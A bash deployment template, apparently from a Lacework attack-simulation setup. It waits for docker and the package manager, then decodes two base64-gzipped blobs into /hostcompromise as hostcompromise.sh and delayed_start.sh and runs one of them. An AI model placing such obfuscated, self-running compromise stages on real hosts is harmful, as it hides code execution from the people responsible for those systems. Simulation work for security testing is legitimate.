#!/usr/bin/env bash

# TEMPLATE INPUTS
# script_name: name of the script, which will be used for the log file (e.g. /tmp/<script_name>.log)
# log_rotation_count: total number of log files to keep
# apt_pre_tasks: shell commands to execute before install
# apt_packages: a list of apt packages to install
# apt_post_tasks: shell commands to execute after install
# yum_pre_tasks:  shell commands to execute before install
# yum_packages: a list of yum packages to install
# yum_post_tasks: shell commands to execute after install
# script_delay_secs: total number of seconds to wait before starting the next stage
# next_stage_payload: shell commands to execute after delay

export SCRIPTNAME="tag"
export LOCKFILE="/tmp/lacework_deploy_$SCRIPTNAME.lock"
export LOCKLOG=/tmp/lock_$SCRIPTNAME.log
export MAXLOG=2
truncate -s0 $LOCKLOG
# Initial lock is debug for lock handler
export LOGFILE=$LOCKLOG
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}

# in some cases we'll have multiple executions as the same time - try to randomize start time
RAND_WAIT=$(($RANDOM%(300-30+1)+30))
log "waiting $RAND_WAIT seconds before starting..."
sleep $RAND_WAIT

if command -v yum && ! command -v ps; then
    RETRY="--setopt=retries=10"
    yum update $RETRY -y && yum $RETRY install -y procps
fi

CURRENT_PROCESS=$(echo $$)
PROCESSES=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip")
PROCESS_NAMES=$(echo -n $PROCESSES | xargs --no-run-if-empty ps fp)
COUNT=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip" | wc -l)
# logs initially appended to current log - no log rotate before checking lock file
log "Lock pids: $PROCESSES"
log "Lock process names: $PROCESS_NAMES"
log "Lock process count: $COUNT"
if [ -e "$LOCKFILE" ] && [ $COUNT -gt 1 ]; then
    log "LOCKCHECK: Another instance of the script is already running. Exiting..."
    exit 1
elif [ -e "$LOCKFILE" ] && [ $COUNT -eq 1 ]; then
    log "LOCKCHECK: Lock file with no running process found - updating lock file time and starting process"
    touch "$LOCKFILE"
else
    log "LOCKCHECK: No lock file and no running process found - creating lock file"
    mkdir -p "$(dirname "$LOCKFILE")" && touch "$LOCKFILE"
fi
function cleanup {
    rm -f "$LOCKFILE"
}
trap cleanup EXIT INT TERM
trap cleanup SIGINT

# Update lofile after lock check
export LOGFILE=/tmp/lacework_deploy_$SCRIPTNAME.log

# Log rotate
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

# Determine Package Manager
if command -v apt-get &>/dev/null; then
    export PACKAGE_MANAGER="apt-get"
    PACKAGES=""
    RETRY="-o Acquire::Retries=10"
elif command -v yum &>/dev/null; then
    export PACKAGE_MANAGER="yum"
    PACKAGES=""
    RETRY="--setopt=retries=10"
else
    log "Neither apt-get nor yum found. Exiting..."
    exit 1
fi

# Wait for Package Manager
check_package_manager() {
    if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
        # Return 0 (false) if a package manager process is found, indicating it's busy
        ! pgrep -f "apt-get (install|update|remove|upgrade)" && \
        ! pgrep -f "aptitude (install|update|remove|upgrade)" && \
        ! pgrep -f "dpkg (install|configure)"
    else
        # Similar logic for yum/rpm
        ! pgrep -f "yum (install|update|remove|upgrade)" && \
        ! pgrep -f "rpm (install|update|remove|upgrade)"
    fi
}

check_payload_update() {
    local payload_path=$1  # First argument passed to the function
    local start_hash=$2
    local check_hash=$(sha256sum --text "$payload_path" | awk '{ print $1 }')
    log "comparing start payload hash: $start_hash to current payload hash: $check_hash"
    if [ "$check_hash" != "$start_hash" ]; then
        log "payload update detected..."
        return 1  # Return 1 if payload update is detected
    else
        log "no payload update..."
        return 0  # Return 0 if no update is detected
    fi
}

# if package manager is busy wait some random amount of time - again to create more randomness
while ! check_package_manager; do
    RAND_WAIT=$(($RANDOM%(300-30+1)+30))
    log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
    sleep $RAND_WAIT
done

# export functions for child script usage
export -f log check_payload_update

# Conditional Commands based on package manager
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt pre-task";
log "Checking for docker..."
while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(command -v  docker)"

log "Done apt pre-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum pre-task";
log "Checking for docker..."
while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(command -v  docker)"

log "Done yum pre-task";
fi
if [ "" != "$PACKAGES" ]; then
    while true; do
        /bin/bash -c "$PACKAGE_MANAGER update && $PACKAGE_MANAGER install -y $PACKAGES" >> $LOGFILE 2>&1
        if [ $? -ne 0 ]; then
            log "Failed to install some_package using $PACKAGE_MANAGER - retry required"
            while ! check_package_manager; do
                RAND_WAIT=$(($RANDOM%(300-30+1)+30))
                log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
                sleep $RAND_WAIT
            done
        else
            break
        fi
    done
fi
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt post-task";

log "Done apt post-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum post-task";

log "Done yum post-task";
fi

MAX_WAIT=30
CHECK_INTERVAL=60
log "starting delay: $MAX_WAIT seconds"
SECONDS_WAITED=0
while true; do 
    SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
    if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
        log "completed wait $((MAX_WAIT / 60)) minutes." && break
    fi
    sleep $CHECK_INTERVAL;
done
log "delay complete"

log "starting next stage after $SECONDS_WAITED seconds..."
log "starting execution of next stage payload..."
log "removing previous app directory"
rm -rf /hostcompromise
log "creating app directory"
mkdir -p /hostcompromise
cd /hostcompromise
echo H4sIAAAAAAAA/5SQz86aQBRH9/MUv46QQCxQXGo06aK1TTQu2qR/NmWAK0wcmCkMuFDfvRm0totv821nzsm998zeJLlsk1z0NWO7w/bj592HdWIbk9S6t4VuTKcb2VPc17HSFTsObWGlbqF0hQsDACpqjawUlhANmHP/R+Q3kV9+9T8t/f3S//KTZxxeyl9HY7OB99iI3dj+/ffdYbtesKPuICFbZD39hhcE958oDUNEKdJshVKjGcH/2jG/ePKtFwRynobhDYtNUtKYtINSuF5hu4Gc0xJrxufI//SUv6Swoqbi9EsYG4SPEqbqyCA6ggtjuQP/vZTmVHF2Y+daKsLTdYMn1/Xk34S0sq3gbhTGwmrkBDEKqUSuKI7je8ReERmk79i0NZvc3orOyRM0cw3Oujuhpo7ugGP5iv0BAAD//wEAAP//SwrL9fIBAAA= | base64 -d | gunzip > hostcompromise.sh
echo H4sIAAAAAAAA/5RUX2+7NhR996e480gF6gih0vaQKJGilLVR82dq0NptmhIHLsEK2AxM2qrtd58wJA3R9pN+eQk255x7OPfaP/7gbLlwtqyICZktJw+/TmfekDoqzZwQE/a2jmWhAplmuUx5gd1EBntKeAR/gY1AjSOHwt8DUDEKAgCAQSyBjoVUMebARaGYCBBkVEGgCHKeKeAFsCRHFr5BXgrBxa4L3itX1UO3S2uhV67AJZgUqNfpPuQ52BlQwwx5LljaMmFRuLoCJcsgPt8mESdRKQLFpYAgQSbKDN61YJ6CHbWwn0TlLDvBvOepD9OFD773OCdkNXmc/uYvxnNvaJhbVqC2YPQsMlve6fB0dsYXrpvI3Vf1RO6ayjqjTcgUgl3CNe38YXdSuxP6nft+Z97vrP6kGwqGS78PDaMRGI0X8knm4+fZ8m54QyKZAwcuYFPgP2CYZv3Gdi0LbBfczQBCCelBZ6HZXfpu8J8M0+TXrmV9ws3ICfHgiDJJ4OMDVF5ixRFI0sOp5Bndpf9FIUGMwX7NMmVaOolsl2Omm8AyRSvY106Y7XdVR15iniCcmFVZAjpL+sT0xED1fSxToCRsEdiB8YRtE2wmqUgQM3B7RPutUlk/jaf+kCnFgv1ajzqZ3HuTh/V04XuPv49nw5/J2PfHk4d13cuh0z4KF8tudYK0o6N4H4zjI63ftPT6YLTWtKEXiuX6i2pvoL2daUGBgRRhQcnKmywXtyu9690Oe01Mx8aAHhyt+cK4whCMNuOoVGU00OALRcM0LxjX0A7JsjRP3weX6vYOz1yfXw8nX1V8CVbWKofNVNZ4B37pWRakXJQKi+Y6qH7bHNleryKu/+reGm1jg7rTuopOEI61/i/ngqdlwvQhZZHC/FtpkdOtedHE89MHN6Mrtyl2KwXSfwEAAP//AQAA//9zWAHebQUAAA== | base64 -d | gunzip > delayed_start.sh
log "starting background delayed script start..."
/bin/bash delayed_start.sh
log "done."

log "done next stage payload execution."

log "Done"